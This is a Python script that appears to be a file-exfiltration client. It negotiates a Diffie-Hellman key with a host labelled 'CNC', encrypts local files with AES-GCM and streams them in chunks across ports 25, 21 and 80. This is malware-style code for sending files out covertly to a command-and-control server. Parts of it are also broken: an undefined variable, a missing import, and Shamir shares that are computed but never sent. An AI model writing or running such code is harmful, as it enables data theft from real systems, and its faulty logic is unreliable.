import socket
import os
from threading import Thread
import time
import random
from Crypto.Protocol.SecretSharing import Shamir
import pyDH
import json
from base64 import b64encode
from Crypto.Cipher import AES

def decrypt_message(msg_in_bytes, key):
    try:
        key = key[:16]
        if isinstance(key, str):
            key = key.encode()
        b64 = json.loads(json_input)
        json_k = [ 'nonce', 'header', 'ciphertext', 'tag' ]
        jv = {k:b64decode(b64[k]) for k in json_k}
        cipher = AES.new(key, AES.MODE_GCM, nonce=jv['nonce'])
        cipher.update(jv['header'])
        plaintext = cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])
        # print("The message was: " + plaintext)
        return plaintext.encode(), jv['header']
    except (ValueError, KeyError):
        print("Incorrect decryption")    


def encrypt_message(msg_in_bytes, header_in_bytes, key):
    # returns encrypted json result in bytes
    key = key[:16]
    if isinstance(key, str):
        key = key.encode()
    header = header_in_bytes
    data = msg_in_bytes
    cipher = AES.new(key, AES.MODE_GCM)
    cipher.update(header)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    json_k = [ 'nonce', 'header', 'ciphertext', 'tag' ]
    json_v = [ b64encode(x).decode('utf-8') for x in (cipher.nonce, header, ciphertext, tag) ]
    result = json.dumps(dict(zip(json_k, json_v)))
    return result.encode()


class Communication(Thread):
    def __init__(self, dst_ip, dst_port):
        Thread.__init__(self)
        self.dst_ip = dst_ip
        self.dst_port = dst_port

    def create_socket(self):
        print(f"[+] Connecting to {self.dst_ip}:{self.dst_port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # disable Nagle algorithm
        s.connect((self.dst_ip, self.dst_port))
        print("[+] Connected.")
        return s

###################################
class TCP_Listener:
    ip = "0.0.0.0"
    port = 81
    buffer_size = 256

    @classmethod
    def get_next_message(cls):
        s = cls.create_socket(cls.ip, cls.port)
        s.listen(5)
        client_socket, address = s.accept()
        packet_info = bytearray(client_socket.recv(8))
        if len(packet_info) == 8:
            msg_type = int.from_bytes(packet_info[:4], 'big')
            size = int.from_bytes(packet_info[4:8], 'big')
            print(f"[+] Message Type: {msg_type}\tSize: {size}")
            bytes_read = bytearray(client_socket.recv(size))

            if msg_type == 1:
                dh_pubkey = int.from_bytes(bytes_read[:256],'big')
                result_msg = dh_pubkey

            elif msg_type == 2:
                result_msg = int(bytes_read.decode())

        client_socket.close()
        s.close()
        return msg_type, result_msg

    @classmethod
    def create_socket(cls, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # disable Nagle algorithm
        s.bind((ip, port))
        return s

###################################

class Sender:
    def __init__(self):
        self.dh = pyDH.DiffieHellman()
        self.dh_pubkey = self.dh.gen_public_key()
        self.CNC = "127.0.0.1"
        self.CNC_regular_port = 444
        self.PORTLIST = [25,21,80]
        self.RECEIVER_DH_PUB_KEY = None

        self.send_msg(1, self.dh_pubkey.to_bytes(256, 'big'))
        
        ###########################################

        msg_type, result = TCP_Listener.get_next_message()
        if msg_type == 1:
            self.RECEIVER_DH_PUB_KEY = result
        else:
            exit()
        self.dh_sharedkey = self.dh.gen_shared_key(self.RECEIVER_DH_PUB_KEY)
        print(self.dh_sharedkey)
        time.sleep(0.1)

        ###########################################


    def send_msg(self, msg_type, msg, ip=None, port=None):
        if ip == None:
            ip = self.CNC
        if port == None:
            port = self.CNC_regular_port
        comm = Communication(ip, port)
        try:
            s = comm.create_socket()

            msg_size = len(msg)
            info = bytearray() # filename and filesize
            info.extend(bytearray(msg_type.to_bytes(4, 'big')))
            info.extend(bytearray(msg_size.to_bytes(4, 'big')))
            info.extend(bytearray(msg))
            s.send(info)
            s.close()
            del comm
        except KeyboardInterrupt:
            s.close()
            del comm
            exit()


    def send_file_info(self, filename, size, ip=None, port=None):
        if ip == None:
            ip = self.CNC
        if port == None:
            port = self.CNC_regular_port

        msg = {}
        msg["filename"] = os.path.relpath(filename)
        msg["filesize"] = size

        msg = json.dumps(msg)
        msg_in_bytes = msg.encode()

        msg_encrypted = encrypt_message(msg_in_bytes, b"", self.dh_sharedkey)
        self.send_msg(2, msg_encrypted, ip, port)


    def send_file(self, filename, port_list=None, ip=None):
        if ip == None:
            ip = self.CNC        
        if port_list == None:
            port_list = self.PORTLIST

        comms = [Communication(ip, port) for port in port_list]
        sockets = [comm.create_socket() for comm in comms]

        with open(filename, "rb") as f:
            plain_data = f.read()

        encrypted_data = encrypt_message(plain_data, b"", self.dh_sharedkey)
        print(encrypted_data)
        counter = 0
        left = len(encrypted_data) # amount of data left to be sent

        self.send_file_info(filename, left)

        msg_type, result = TCP_Listener.get_next_message()
        if msg_type == 2:
            filecounter = result
            print("Filecounter received: ", filecounter)
        else:
            exit()



        while True:
            size = 16

            if (left // size):
                sent = size
            else:
                sent = left % size

            bytes_read = encrypted_data[counter*size:counter*size+size]

            if len(bytes_read) != 0 and len(bytes_read) != 16:
                bytes_read += b'\x00' * (16 - len(bytes_read))


            if len(bytes_read) == 0: # break when there's nothing to be sent
                break

            shares = Shamir.split(2, 3, bytes_read)
            for ctr, (idx, share) in enumerate(shares):
                packet = bytearray()
                packet.extend(bytearray((counter).to_bytes(4, 'big')))
                packet.extend(bytearray((idx).to_bytes(4, 'big')))
                packet.extend(bytearray((filecounter).to_bytes(4, 'big')))
                packet.extend(bytes_read)
                sockets[ctr].sendall(packet)

            left -= (sent) # update amount of data that will be sent
            counter += 1

        for socket in sockets:
            socket.close()


def main():
    sender = Sender()
    filename = "test.file"
    
    sender.send_file(filename)
    sender.send_file("test.dat")
    sender.send_file("arch.jpg")
    

if __name__ == "__main__":
    main()